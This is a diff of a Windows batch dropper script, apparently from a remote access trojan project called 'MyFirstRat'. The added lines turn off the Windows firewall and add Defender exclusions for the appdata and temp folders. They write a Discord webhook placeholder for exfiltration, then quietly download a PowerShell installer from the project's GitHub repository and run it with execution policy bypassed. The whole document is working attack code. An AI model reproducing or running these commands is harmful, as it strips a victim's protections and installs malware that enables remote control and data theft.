@@ -26,24 +26,16 @@ if '%errorlevel%' NEQ '0' (
 @REM vars
 SET STARTDIR="%cd%"
 SET RUNPATH="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+echo DISCORDWEBHOOK > "%temp%\u.cfg"
 
-@REM Payloads
 cd %RUNPATH%
-
-@REM SMTP
-
-
-echo "test@example.com" > u.txt
-echo "pwds" > up.txt
-
 
 @REM disable
 netsh firewall set opmode disable
 netsh Advfirewall set allprofiles state off
-powershell powershell.exe -ep bypass -windowstyle hidden Add-MpPreference -ExclusionPath "%appdata%\\"; Add-MpPreference -ExclusionPath "$env:temp"
-
-@Rem resources
-powershell powershell.exe -ep bypass -windowstyle hidden "Invoke-WebRequest -Uri URL_ADDR -OutFile installer.ps1"; ./installer.ps1
+powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "%appdata%\\"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hallowslab/MyFirstRat/master/src/modules/scripts/installers/installer.ps1" -OutFile installer.ps1;
+powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
 
 @Rem del wget.cmd
 ::DEL wget.cmd
